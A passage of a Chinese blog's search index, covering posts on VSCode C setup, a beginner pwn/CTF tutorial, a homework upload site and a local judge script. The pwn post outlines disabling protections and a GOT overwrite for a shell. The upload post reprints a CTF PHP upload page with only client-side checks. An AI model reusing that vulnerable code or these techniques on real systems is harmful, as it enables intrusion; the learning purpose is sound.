&lt;your-azure&gt;User=&lt;你的用户名&gt;Restart=always[Install]WantedBy=multi-user.target 然后 sudo systemctl daemon-reload 一下，再 sudo systemctl start ssh-tunnel 就行了，sudo systemctl enable ssh-tunnel 可以设置开机自启。 参考 https://zhuanlan.zhihu.com/p/562014043","link":"/2023/05/14/Squid%20%E4%BB%A3%E7%90%86%E7%AE%80%E8%AE%B0/"},{"title":"VSCode 写 C","text":"一句话：VSCode 确实是一个好东西 前言 在用 VSCode 前，我写 C 一直用的是 VS2019 ，直到我看见了 GZTime 学长写的 Visual Studio Code Guide 一文并照着配了后，我乐了，原来 VSCode 如此好用。首先作为一个编辑器，它比 VS2019 这个 IDE 小了太多（一个几十 MB ，一个 10 个 GB ），其次，它配上 gcc 可以避免 VS2019 由于 msvc 导致的 scanf_s 等一堆 _s（或许我的表述不是太严谨，但差不多是这个意思）。本文高度概括了学长的文章，说是转载也不为过，读者根据自身水平可酌情移步至原文。 安装链接下载链接 注意事项 安装 gcc 时取消勾选 Check for updated files on the TDM-GCC server。 安装 VSCode 时在附加任务中“其他”中的四项全部勾选，即将用 Code 打开加入文件和文件夹添加入右键菜单中，并注册为受支持的文件类型的编辑器。 不推荐更改默认文件夹（别抠这点空间了）。 普通配置安装好 VSCode 和 gcc 后，重启电脑，运行 VSCodeCppHelper ，如果你对在哪创建文件夹没有好的选择，就把 VSCodeCppHelper 放 C 盘随便一个地方里运行，然后傻瓜式 enter 。 机房里配置 由于 GZTime 学长写的 VSCodeCppHelper 小工具需要重启才能识别出 VSCode 和 gcc 的安装，但是机房的电脑一重启所有东西又会全部重置，此时便只能手动配置了。（以下均为转载）更新：如今 VSCodeCppHelper 已经支持在没检测到环境变量的情况下进行配置了。 打开 VSCode 至你的文件夹（此处以 C:\\Coding 为例）。 打开左侧 Extensions 选项卡，搜索 C++ 并安装 C/C++ 和 C/C++ Intellisence 两个扩展。 在根目录新建文件夹 Scripts 以及 Debug 在 Scripts 文件夹中新建文件 helloworld.cpp ，写下传统的 helloworld 程序： 1234567#include &lt;bits/stdc++.h&gt;using namespace std;int main(){ cout &lt;&lt; &quot;Hello world!&quot; &lt;&lt; endl; return 0;} 单击左侧菜单中的运行并点击运行和调试，选择 C++(GDB/LLDB) 。 此时 VSCode 会在你的根目录下新建 .vscode 文件夹，此文件夹中用于存放 VSCode 的相关配置文件，打开 launch.json 替换或修改为如下内容： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354{ // 使用 IntelliSense 了解相关属性。 // 悬停以查看现有属性的描述。 // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387 &quot;version&quot;: &quot;0.2.0&quot;, &quot;configurations&quot;: [ { &quot;name&quot;: &quot;C++ Run&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;${workspaceRoot}/Debug/${fileBasenameNoExtension}.exe&quot;, //运行文件的路径 &quot;args&quot;: [], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;${workspaceFolder}&quot;, &quot;environment&quot;: [], &quot;console&quot;: &quot;internalConsole&quot;, &quot;internalConsoleOptions&quot;: &quot;neverOpen&quot;, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;miDebuggerPath&quot;: &quot;C:/TDM-GCC-64/gdb64/bin/gdb.exe&quot;, &quot;setupCommands&quot;: [ { &quot;description&quot;: &quot;为 gdb 启用整齐打印&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true } ], &quot;preLaunchTask&quot;: &quot;Compile&quot; //运行前需要完成的任务 }, { &quot;name&quot;: &quot;C Run&quot;, &quot;type&quot;: &quot;cppdbg&quot;, &quot;request&quot;: &quot;launch&quot;, &quot;program&quot;: &quot;${workspaceRoot}/Debug/${fileBasenameNoExtension}.exe&quot;, //运行文件的路径 &quot;args&quot;: [], &quot;stopAtEntry&quot;: false, &quot;cwd&quot;: &quot;${workspaceFolder}&quot;, &quot;environment&quot;: [], &quot;console&quot;: &quot;internalConsole&quot;, &quot;internalConsoleOptions&quot;: &quot;neverOpen&quot;, &quot;MIMode&quot;: &quot;gdb&quot;, &quot;miDebuggerPath&quot;: &quot;C:/TDM-GCC-64/gdb64/bin/gdb.exe&quot;, &quot;setupCommands&quot;: [ { &quot;description&quot;: &quot;为 gdb 启用整齐打印&quot;, &quot;text&quot;: &quot;-enable-pretty-printing&quot;, &quot;ignoreFailures&quot;: true } ], &quot;preLaunchTask&quot;: &quot;Compile_C&quot; //运行前需要完成的任务 } ]} 在 .vscode 文件夹中新建文件 tasks.json 并输入如下内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586{ &quot;version&quot;: &quot;2.0.0&quot;, &quot;tasks&quot;: [ { &quot;label&quot;: &quot;Compile&quot;, &quot;command&quot;: &quot;g++&quot;, &quot;args&quot;: [ &quot;-g&quot;, &quot;${file}&quot;, //指定编译源代码文件 &quot;-o&quot;, &quot;${workspaceRoot}\\\\Debug\\\\${fileBasenameNoExtension}.exe&quot;, // 指定输出文件名，不加该参数则默认输出a.exe &quot;-ggdb3&quot;, // 生成和调试有关的信息 &quot;-Wall&quot;, // 开启额外警告 &quot;-static-libgcc&quot;, // 静态链接 &quot;-std=c++2a&quot;, &quot;-Wno-format&quot;, &quot;-finput-charset=UTF-8&quot;, //输入编译器文本编码 默认为UTF-8 &quot;-fexec-charset=UTF-8&quot; //编译器输出文本编码 自行选择 ], &quot;type&quot;: &quot;shell&quot;, &quot;presentation&quot;: { &quot;echo&quot;: true, &quot;reveal&quot;: &quot;silent&quot;, // 在“终端”中显示编译信息的策略，可以为always，silent，never &quot;focus&quot;: false, &quot;panel&quot;: &quot;shared&quot;, // 不同的文件的编译信息共享一个终端面板 &quot;clear&quot;: true, &quot;showReuseMessage&quot;: true }, &quot;problemMatcher&quot;: { &quot;owner&quot;: &quot;cpp&quot;, &quot;fileLocation&quot;: [&quot;relative&quot;, &quot;\\\\&quot;], &quot;pattern&quot;: { &quot;regexp&quot;: &quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;, &quot;file&quot;: 1, &quot;line&quot;: 2, &quot;column&quot;: 3, &quot;severity&quot;: 4, &quot;message&quot;: 5 } } }, { &quot;label&quot;: &quot;Compile_C&quot;, &quot;command&quot;: &quot;gcc&quot;, &quot;args&quot;: [ &quot;-g&quot;, &quot;${file}&quot;, //指定编译源代码文件 &quot;-o&quot;, &quot;${workspaceRoot}\\\\Debug\\\\${fileBasenameNoExtension}.exe&quot;, // 指定输出文件名，不加该参数则默认输出a.exe &quot;-ggdb3&quot;, // 生成和调试有关的信息 &quot;-Wall&quot;, // 开启额外警告 &quot;-static-libgcc&quot;, // 静态链接 &quot;-Wno-format&quot;, &quot;-finput-charset=UTF-8&quot;, //输入编译器文本编码 默认为UTF-8 &quot;-fexec-charset=UTF-8&quot; //编译器输出文本编码 自行选择 ], &quot;type&quot;: &quot;shell&quot;, &quot;presentation&quot;: { &quot;echo&quot;: true, &quot;reveal&quot;: &quot;silent&quot;, // 在“终端”中显示编译信息的策略，可以为always，silent，never &quot;focus&quot;: false, &quot;panel&quot;: &quot;shared&quot;, // 不同的文件的编译信息共享一个终端面板 &quot;clear&quot;: true, &quot;showReuseMessage&quot;: true }, &quot;problemMatcher&quot;: { &quot;owner&quot;: &quot;cpp&quot;, &quot;fileLocation&quot;: [&quot;relative&quot;, &quot;\\\\&quot;], &quot;pattern&quot;: { &quot;regexp&quot;: &quot;^(.*):(\\\\d+):(\\\\d+):\\\\s+(warning|error):\\\\s+(.*)$&quot;, &quot;file&quot;: 1, &quot;line&quot;: 2, &quot;column&quot;: 3, &quot;severity&quot;: 4, &quot;message&quot;: 5 } } } ]} 类似的，配置 c_cpp_properties.json ，这个我不知道要不要（逃 123456789101112131415161718192021222324252627{ &quot;configurations&quot;: [ { &quot;name&quot;: &quot;Win32&quot;, &quot;includePath&quot;: [ &quot;${workspaceFolder}/**&quot; ], &quot;defines&quot;: [ &quot;_DEBUG&quot;, &quot;UNICODE&quot;, &quot;_UNICODE&quot; ], &quot;compilerPath&quot;: &quot;C:/TDM-GCC-64/bin/g++.exe&quot;, &quot;cStandard&quot;: &quot;c11&quot;, &quot;cppStandard&quot;: &quot;c++20&quot;, &quot;intelliSenseMode&quot;: &quot;gcc-x64&quot;, &quot;macFrameworkPath&quot;: [], &quot;browse&quot;: { &quot;path&quot;: [ &quot;C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/*&quot;, &quot;C:/TDM-GCC-64/lib/gcc/x86_64-w64-mingw32/10.3.0/include/c++/*&quot; ] } } ], &quot;version&quot;: 4} 搬砖完毕（逃 中文乱码VSCode 中默认终端常为 PowerShell ，Windows 10 中 PowerShell 默认编码跟随系统，可以通过修改区域设置来改变默认编码： 控制面板-&gt;区域-&gt;更改系统区域设置-&gt;勾选 Beta版：使用Unicode:UTF-8以获取全球语言支持，但这样可能会造成其他应用乱码，笔者就因为这个事情改回去了。 VSCode 使用的注意事项 虽说 VSCode 好，但有几点注意的，被坑过。。。 不要直接在文件夹双击打开 .c 文件启动 VSCode 不要给 .c 文件起中文名 不要在其他文件夹（除了你最初配置好的文件夹，比如桌面）中启动 VSCode 以上配置无法进行多文件编译 以上说法仅针对初学者，均不严谨 参考 Visual Studio Code Guide by GZTimehttps://blog.csdn.net/m0_55005568/article/details/119960552","link":"/2021/12/29/VSCode%20%E5%86%99%20C/"},{"title":"pwn 入门","text":"浅记一下这些天学 pwn 的历程 前言本文默认读者具有一定的汇编基础。 ELF文件的结构ELF（Executable and Linkable Format）即 Linux 下的可执行文件格式，和 Windows 下的 PE 格式类似，但 Linux 中的可执行文件一般不会加后缀名。ELF 文件中有多个节（ Section ），主要有： .text 节：即代码段，用来放代码 .rodata 节：ro 即 read only ，只读数据段，用来放静态数据，如果尝试修改会报错 .rdata 和 .rodata 的区别：两者都是只读数据段，但 .rdata 是 Windows 的常用说法，而 Linux 中则一般称 .rodata .data 节：数据段，存放可修改的数据 .bss 节：中文不知道叫什么名字的段，也是放可修改的数据，但是没有初始化，所以不占ELF文件的空间，程序运行时会自动分配内存 .plt 节和 .got 节：外部调用段（也不知道叫什么名字，这个是 AI 给我打的），调用动态链接库的函数的时候会用到 Linux下的漏洞缓解措施有攻就有防，为了不被攻击者随便打烂，一些防范措施是必不可少的。在终端里可以执行 checksec --file=文件名 来查看 ELF 文件的保护机制。 NX ( No eXecute )(没错 X 就是大写，没打错) 基本规则为可写权限与可执行权限互斥，即可被修改写入 shellcode 的内存都不可执行，被执行的代码数据不可修改，至于 shellcode 是啥，后面再提。 gcc 默认开启，编译加 -z execstack 参数可以关闭 Stack Canary Canary 意为金丝雀，以前矿工进入矿井时都会随身带一只金丝雀，通过观察金丝雀的状态来判断氧气浓度等情况。这个保护专门针对栈溢出攻击。 gcc 同样默认开启，编译加 fno-stack-protector 参数关闭 ASLR ( Address Space Layout Randomization ) 将程序的堆栈地址和动态链接库的加载地址进行一定的随机化 ASLR 是系统级的保护机制，关闭要修改 /proc/sys/kernel/randomize_va_space 文件，写入 0 即可 PIE ( Position Independent Executable ) 和 ASLR 类似，让 ELF 的地址随机化加载 高版本 gcc 默认开启，编译加 -no-pie 参数可以关闭，旧版本则需加 -fpic-pie 参数开启 Full RELRO ( Read-Only Relocation ) 禁止写入 .got.plt 表 gcc 编译加 -z relro 参数开启。 GOT和PLT.plt 表是一段代码，可从内存中读取一个地址然后进行跳转，而 .got.plt 表则存放函数的实际地址。实际上，.got.plt 表是一个函数指针数组，存放 ELF 所有用到的外部函数在内存中的地址，由操作系统初始化。题目中如果没开 Full RELRO 保护，那么就有可能通过修改 .got.plt 表中的函数地址来偷梁换柱，比如把表中 puts 的地址换成 system 的地址就能使 puts(&quot;\\bin\\sh&quot;) 变成 system(&quot;/bin/sh&quot;)，从而拿到 shell 。 常用工具 IDA 拿到程序第一件事——用 IDA 看看伪代码 分 32 位和 64 位两个版本，这个打开不行就换另一个，虽然我也不知道为啥不加个自动识别（） 把程序拖进去，弹出一个奇怪的选项框，初学者直接 enter或者点 OK 就完事，然后进到 IDA View-A 标签页，这里初始时一般是流程图的形式，在此标签页按空格可以切换到普通模式，记住不是在 Pseudocode-A 按 这时候按 F5 生成伪代码，看到顶上的标签页切到了 Pseudocode-A ， Pseudocode 是伪码的意思，至于这个 A ，你如果再按一次 F5 就能新建一个 Pseudocode-B 了（） 然后就可以这点点那点点发现新世界了，嘿嘿 如下是一些常用的快捷键： 按 Esc 可以返回刚才的页面 按 Tab 可以在 IDA View-A 和 Pseudocode-A 等标签页之间切换 双击函数或者变量可以跳转到它所在的地方 点一下变量再按 N 可以对变量重命名，有时方便分析 Shift+F12 查找字符串 pwntools python 的一个库，可以用与远程服务器或者本地程序交互，但不保证在 Windows 下能正常使用（反正我 Windows 跑 pwntools 是有问题的 常用操作： r = process(&quot;./pwn&quot;) 本地运行程序（其实本地一般用 p 作变量表示process或者io兼顾本地和远程，看个人习惯了 r = remote(ip, port) 连接服务器 r.sendline(data) 发送数据，末尾补 \\x0a（换行符） r.send(data) 发送数据，末尾不补 \\x0a r.recvline() 接收一行数据 r.recvuntil(str) 接收直到遇到 str 为止 r.recv(n)接收 n 个字节 r.interactive() 开始人工手动交互 pwntools 在 python3 中使用的话，交互的数据都是 bytes 类型，而不是 str 类型，意思就是 send 里的东西要是字节串， recv 出来的也是字节串，字符串转字节方法一般是 str.encode() ，或者 send(b'hello') pwndbg pwn 里面少不了本地调试，正常人都不能肉眼分析，那么就要用到 gdb ，but 裸的 gdb 太朴素了，不能满足人们日益增长的对优雅的追求，所以就有了颜值极高的 gdb 插件—— pwndbg 安装方式： 123git clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.sh 然后康康 ~/.gdbinit 里有没有 source ~/pwndbg/gdbinit.py ，如果没有就加上，然后 source ~/.gdbinit ，然后就可以愉快地玩耍了 在 VSCode 里起 gdb 要用 tmux ，直接 sudo apt-get install tmux 安装 tmux的简单使用： tmux 进入窗口 tmux ls 查看会话列表 Ctrl+B 左右键 切换会话窗口，一般默认左右分布，也可调成上下 Ctrl+B D 退出当前会话但不关闭，可以 tmux attach -t &lt;会话名&gt; 再次进入 脚本里可以使用如下语句起 gdb： 123p = process('./pwn')context.terminal = ['tmux','splitw','-h']gdb.attach(p,gdbscript=&quot;b main&quot;) pwndbg 界面由上至下依次为 legend：图例，一般指示黄色为 Stack（栈），蓝色为 Heap（堆），红色为 Code（代码），紫色为 Data（数据），白色下划线为RWX（不知道啥），白色为 Rodata（只读数据） registers：显示 CPU 的寄存器值 disasm：显示当前地址的反汇编代码 stack：显示栈的内容 backtrace：显示调用堆栈（我也不知道具体干嘛的） 常用操作： x/4xg 0x400000 查看内存中地址 0x400000 开始的 4*16 个字节，以 8 个字节每组的 16 进制形式显示，一般在分析 64 位程序时使用，因为 64 位程序的地址是 8 个字节， 32 位时，命令可以换成 x/4x ，每组 4 个字节，适用 32 位程序的地址 ni 也就是 next into ，执行下一条指令，如果是函数调用，就进入函数 si 也就是 step into ，执行下一条指令，如果是函数调用，就进入函数，但是不会执行函数内的第一条指令，而是停在函数内的第一条指令上 c continue ，继续执行，直到遇到断点或者程序结束 q quit ，退出 gdb vmmap 查看内存映射，可以看到程序的基地址，栈地址，堆地址等，后面加个 libc 可以单看 libc 的基地址（白色的那行 set 改变变量的值，比如 set $eax=0 就把 eax 的值改成了 0 b 设置断点，后面加地址或者函数名，比如 b *0x400000 或者 b main ，后者是在 main 函数入口处设置断点，或者 b *main+111 在 main 函数的第 111 条指令处设置断点 常见攻击方式整数溢出这个比较简单，大概就是通过溢出绕过一些大小判断，不再赘述。 栈溢出先说几个概念执行 call 指令时， CPU 会先把 call 指令的下一条指令地址压栈再跳转，返回时 ret 指令会从栈中把存放的地址弹出到 EIP 。gets 不检查读入的字符串长度，所以可能会出现栈溢出。当栈作为缓冲区时，如果输入的数据长度超过缓冲区的长度，就会发生栈溢出，从而覆盖返回地址，从而控制程序流程。 未完待续… 参考 《从0到1：CTFer成长之路》——Nu1L战队[著] 《CTF竞赛权威指南.Pwn篇》——杨超[著] https://blog.csdn.net/sui_152/article/details/121650341 https://stackoverflow.com/questions/65745514/what-is-the-difference-between-rodata-and-rdata https://blog.csdn.net/weixin_52553215/article/details/120690453 https://blog.csdn.net/zino00/article/details/122716412 https://blog.csdn.net/Demondai999/article/details/123875264","link":"/2022/07/18/pwn%20%E5%85%A5%E9%97%A8/"},{"title":"一个简单的作业提交平台","text":"这个项目大概是上星期五晚开始做的，之所以现在才写这篇文，纯粹是因为没有时间，刚好今早把高数写完了， CAD 又不想动，于是便借此时间简单总结一下。 首先写这个网站的起因是邮箱发作业实在是过于麻烦，看着隔壁广州计算机的都用着 Matrix（一个我们大学学生运维的 OJ ，即在线判题平台），一点提交就有结果，而我们交作业却是原始的上交源文件和运行截图，我也无何办法，谁让我们是材料计算机呢（并无歧视材料的意思，只是单纯地憎恶化学，高中本就没选）。等我和课代表商量的时候，他也表示早已被不按规则提交的作业搞得苦不堪言（乐），想了想，虽然费劲写个小破站有些浪费时间，与大卷之势相悖，但毕竟也算有点意思，便做了下去。 开始最初的文件是直接抄中国人民公安大学的一道信安题的，代码附上： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465header(&quot;Content-type: text/html;charset=utf-8&quot;);error_reporting(0);//设置上传目录define(&quot;UPLOAD_PATH&quot;, dirname(__FILE__) . &quot;/upload/&quot;);// define(&quot;UPLOAD_URL_PATH&quot;, str_replace($_SERVER['DOCUMENT_ROOT'], &quot;&quot;, UPLOAD_PATH));if (!file_exists(UPLOAD_PATH)) { mkdir(UPLOAD_PATH, 0755);}if (!empty($_POST['submit'])) { if (!$_FILES['file']['size']) { echo &quot;&lt;script&gt;alert('请添加上传文件')&lt;/script&gt;&quot;; } else { $name = basename($_FILES['file']['name']); if (move_uploaded_file($_FILES['file']['tmp_name'], UPLOAD_PATH . $name)) { echo &quot;&lt;script&gt;alert('上传成功')&lt;/script&gt;&quot;; echo &quot;上传文件相对路径&lt;br&gt;&quot; . &quot;/upload/&quot; . $name; } else { echo &quot;&lt;script&gt;alert('上传失败')&lt;/script&gt;&quot;; } }}$myfile = fopen(&quot;log.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;); fwrite($myfile,$_SERVER[&quot;REMOTE_ADDR&quot;]); $txt=&quot;\\n&quot;; fwrite($myfile,$txt); fclose($myfile);?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;PPSUC 文件上传 - js前端验证&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;PPSUC 文件上传 - js前端验证&lt;/h1&gt; &lt;p&gt;本题从PPSUC窃取得来&lt;/p&gt; &lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; onsubmit=&quot;return checkfilesuffix()&quot;&gt; &lt;label for=&quot;file&quot;&gt;Filename:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt; &lt;br /&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt; &lt;/form&gt;&lt;script&gt;function checkfilesuffix(){ var file=document.getElementsByName('file')[0]['value']; if(file==&quot;&quot;||file==null) { alert(&quot;请添加上传文件&quot;); return false; } else { var whitelist=new Array(&quot;.jpg&quot;,&quot;.png&quot;,&quot;.gif&quot;); var file_suffix=file.substring(file.lastIndexOf(&quot;.&quot;)); if(whitelist.indexOf(file_suffix) == -1) { alert(&quot;:(该文件不允许上传:(&quot;); return false; } }}&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这题考的是 JS 前端验证的绕过，解出题后的我深知前端验证的不可靠，便知道敏感的操作限制应该加在后端了。但毕竟前端也得有点拦一下不是，否则累死后端不说，代码冗杂也是一个问题。上百度抄一抄，后端的后缀限制也完成了（解释一下，之所以限制文件后缀，一方面是因为提交的文件格式问题，一方面是安全问题，假若给你上传了一个 php 木马而我又没加限制访问的情况下， RCE 就是件很简单的事情了，之后你可以查看和操作任意权限允许的文件，总之是很危险的事）。在完成后缀的限制后，我又加了如下的诸多验证： 文件大小非空且大小须小于512KB(后来改成了666KB) ：否则给你当网盘使那我服务器也是难顶，而且源文件最大也没什么可能超过 10 KB，截图预计也是几十 KBupload目录的访问限制：可不能给随便偷了作业看姓名不能为空且不多于4个字：这个问过课代表，我们班的名字没有超过 3 个字的学号范围：086-199 ，但有一个人的学号孤悬在外，有些奇怪（乐）姓名和学号的联合验证：这个是前两天才加上去的，主要是忘了之前的军事课有份名单（但是那位竟然是没有的，再处理吧） 后端处理逻辑重构一开始我是设置先新建（姓名+学号）的一个目录，再逐个文件进行判断，若符合条件则放进目录里，但这就会引发一个问题，如果有文件不符合条件的话目录仍会存在，而为了防止有意或是无意的重复上传导致原文件被覆盖，我又设置了若目录已存在则不能继续放文件,于是我在上机课的时候改成了先全部验证通过再上传目录。 管理员端毕竟作业也不是我收的，如果每次都要我来登录服务器下载未免也太过麻烦，于是我抄了段多级目录压缩的代码，在管理员通过验证后将提交上的作业打包成了个 zip ，再存储于基于 SHA256 算法生成的时间哈希值命名的目录中，这样大概便无法被直接扫描出来了。管理员的登录验证我采用的是RSA公钥加密出的一段 base64 编码的字符串，若在后端用私钥解密后得到明文”admin”便通过验证，但想了想似乎没必要用非对称加密，有空再改。除此之外，我还加了个验证码，但是在 Firefox 上似乎不能正常刷新，于是就没加在学生端了。 前端的样式这个是我最无奈的地方，个人的美术功底着实是捞得亚匹，布局和配色搞得乱七八糟，在此就希望同学多多与我反馈了。 一些问题开源本来打算上传到 github 的，但是还没处理好重要文件的放置（总不能学号和姓名也开源不是）。 更新：项目已发布于https://github.com/weyung/A-simple-homework-submission-platform JQuery说来有些可笑，我一开始是用原生 Javescript 写的前端，代码繁琐且在使用 ajax 的时候被异步坑了一把：我写了一个函数调用后端的接口然后 return 数据，却发现主函数中得到的结果总是 undefined ，后来才知道是先 return 再接收数据，晕。而用 JQuery 一个回调函数就搞定了，虽然 JQuery 似乎的确有些过时，但有空再看 React、Vue 什么的吧。 SSH之前是想用 VSCode 写代码的，但是 SSH 一直显示什么管道不存在，直到今晚才瞎搞接通了。用宝塔的在线文本编辑器写了一个星期的代码，现在终于能有舒服点的高亮了。至于调试也是个问题，因为懒得搭本地环境，我至今还是肉眼调试，有空也得处理下。","link":"/2021/12/19/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E4%BD%9C%E4%B8%9A%E6%8F%90%E4%BA%A4%E5%B9%B3%E5%8F%B0/"},{"title":"一个简单的本地判题脚本","text":"在做程序设计作业的时候，题目经常是要输入 10 个数字，但用不起 Matrix 的我只能手动输入，不但麻烦，而且也很难模拟随机过程，想过做一个 OJ （在线判题平台），但又苦于不会用 Docker ，思来想去，就用 Python 写了个本地判题脚本，虽然还不能防恶意代码，也无法实现内存检查，但基本的输入输出还是能够做到，供君一乐。 源码Windows下鉴于本人是追求实用（能跑就行），同理猜测读者也不关心这到底怎么实现，或者说不着急关心，于是直接附上 Windows 环境下的 Python 源码，开盒即用，只需要你有一点 Python 的基础，会装 subprocess 和 tqdm 库就行，然后在脚本所在的目录新建一个名为标准代码的文件夹，并在里面放入一个std.c作为测试输出的基准参照，同理新建一个测试代码的文件夹并放入test.c作为被测试的代码，同时安装好gcc，运行脚本，就能大功告成了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import subprocessimport randomimport sysfrom tqdm import tqdmdef random_int_list(start, stop, length): start, stop = (int(start), int(stop)) if start &lt;= stop else ( int(stop), int(start)) length = int(abs(length)) if length else 0 random_list = [] for i in range(length): random_list.append(random.randint(start, stop)) return random_listdef iotest(filename, path, data): obj = subprocess.Popen([filename], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=&quot;utf-8&quot;,shell=True) obj.stdin.write(data) out_info, out_error = obj.communicate() # 简单写法，out_info：标准输出 # print(out_info,out_error) return out_infoif __name__ == '__main__': stdpath = &quot;%s\\\\标准代码\\\\&quot; % sys.path[0] # 标准代码所在路径 testpath = &quot;%s\\\\测试代码\\\\&quot; % sys.path[0] # 测试代码所有路径 #编译标准及测试代码 result = subprocess.check_output(&quot;gcc -std=c99 -o std std.c&quot;, shell=True, cwd=stdpath) result = subprocess.check_output(&quot;gcc -std=c99 -o test test.c&quot;, shell=True, cwd=testpath) f = open('%s\\测试结果.txt' % sys.path[0], 'w+', encoding='utf-8', newline=&quot;&quot;) print('随机测试中...') pas=0 # 通过次数 freq=10 # 测试次数 for index in tqdm(range(freq)): # 生成测试数据 rtest = random_int_list(0, 99, 10) s = '' for i in rtest: s = &quot;%s%s &quot; % (s, i) s = &quot;%s\\n&quot; % s # 进行测试 output = iotest(&quot;.\\\\test.exe&quot;, testpath, s) stdoutput = iotest(&quot;.\\\\std.exe&quot;, stdpath, s) f.write(&quot;随机测试 - r,%d数据点\\n&quot;%index) f.write(&quot;标准输入\\n%s&quot; % s) f.write(&quot;实际输出\\n%s\\n&quot; % output) f.write(&quot;期望输出\\n%s\\n\\n&quot; % stdoutput) if output==stdoutput: f.write('通过「随机测试 - r,%d数据点」测试点\\n\\n'%index) pas=pas+1 else: f.write('未通过「随机测试 - r,%d数据点」测试点\\n\\n'%index) f.close() print('随机测试 %d/%d'%(pas,freq)) print('测试完成') 同时附上样例标准代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;stdio.h&gt;#define N 10void inputarray(int *arr);void handlearray(int *arr);void outputarray(int *arr);void swap(int *p,int *q);int main(){ int array[N]= {0}; inputarray(array); handlearray(array); outputarray(array); return 0;}void swap(int *p,int *q){ int temp=*p; *p=*q; *q=temp;}void handlearray(int *arr){ int *p=arr; int max_index=0; int min_index=0; int max=arr[0]; int min=arr[0]; for(int i=1;i&lt;N;i++) { if(*(p+i)&gt;max) { max=*(p+i); max_index=i; } if(*(p+i)&lt;min) { min=*(p+i); min_index=i; } } swap((p+max_index),(p+9)); swap((p+min_index),(p+0));}void inputarray(int *arr){ int *p=arr; for(int i=0; i&lt;N; i++) { scanf(&quot;%d&quot;,(p+i)); }}void outputarray(int *arr){ int *p=arr; for(int i=0; i&lt;N; i++) { printf(&quot;%d &quot;,*(p+i)); }} 以及样例测试代码： 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;int main(){ void inv(int *x, int n); int i, a[10]; for (i = 0; i &lt; 10; i++) scanf(&quot;%d&quot;, &amp;a[i]); //printf(&quot;\\n&quot;); inv(a, 10); //printf(&quot;The array has been inverted:\\n&quot;); for (i = 0; i &lt; 10; i++) printf(&quot;%d &quot;, a[i]); //printf(&quot;\\n&quot;); return 0;}void inv(int *x, int n){ int *i, max, min, p, q, *c, *d; max = *x; min = *(x + 1); c = x + 0; d = x + 1; for (i = x; i &lt; x + 10; i++) if (*i &gt; max) { max = *i; c = i; } for (i = x; i &lt; x + 10; i++) if (*i &lt; min) { min = *i; d = i; } p = *x; *x = *d; *d = p; q = *(x + 9); *(x + 9) = *c; *c = q;} Linux 下的 Python 源码一个现象就是， Linux 下进行测试的速度明显比 Windows 下快，我测试的时候两者甚至相差 100 余倍，其中原因可留给读者细究。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import subprocessimport randomimport sysfrom tqdm import tqdmdef random_int_list(start, stop, length): start, stop = (int(start), int(stop)) if start &lt;= stop else ( int(stop), int(start)) length = int(abs(length)) if length else 0 random_list = [] for i in range(length): random_list.append(random.randint(start, stop)) return random_listdef iotest(filename, path, data): obj = subprocess.Popen([filename], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=path, encoding=&quot;utf-8&quot;) obj.stdin.write(data) out_info, out_error = obj.communicate() # 简单写法，out_info：标准输出 # print(out_info,out_error) return out_infoif __name__ == '__main__': stdpath = &quot;%s/标准代码/&quot; % sys.path[0] # 标准代码所在路径 testpath = &quot;%s/测试代码/&quot; % sys.path[0] # 测试代码所有路径 #编译标准及测试代码 result = subprocess.check_output(&quot;gcc -std=c99 -o std std.c&quot;, shell=True, cwd=stdpath) result = subprocess.check_output(&quot;gcc -std=c99 -o test test.c&quot;, shell=True, cwd=testpath) f = open('%s/测试结果.txt' % sys.path[0], 'w+', encoding='utf-8', newline=&quot;&quot;) print('随机测试中...') pas=0 # 通过次数 freq=100 # 测试次数 for index in tqdm(range(freq)): # 生成测试数据 rtest = random_int_list(0, 99, 10) s = '' for i in rtest: s = &quot;%s%s &quot; % (s, i) s = &quot;%s\\n&quot; % s # 进行测试 output = iotest(&quot;./test&quot;, testpath, s) stdoutput = iotest(&quot;./std&quot;, stdpath, s) f.write(&quot;随机测试 - r,%d数据点\\n&quot;%index) f.write(&quot;标准输入\\n%s&quot; % s) f.write(&quot;实际输出\\n%s\\n&quot; % output) f.write(&quot;期望输出\\n%s\\n\\n&quot; % stdoutput) if output==stdoutput: f.write('通过「随机测试 - r,%d数据点」测试点\\n\\n'%index) pas=pas+1 else: f.write('未通过「随机测试 - r,%d数据点」测试点\\n\\n'%index) f.close() print('随机测试 %d/%d'%(pas,freq)) print('测试完成')","link":"/2021/12/28/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84%E6%9C%AC%E5%9C%B0%E5%88%A4%E9%A2%98%E8%84%9A%E6%9C%AC/"},{"title":"变量指针指向的常量","text":"关于 char 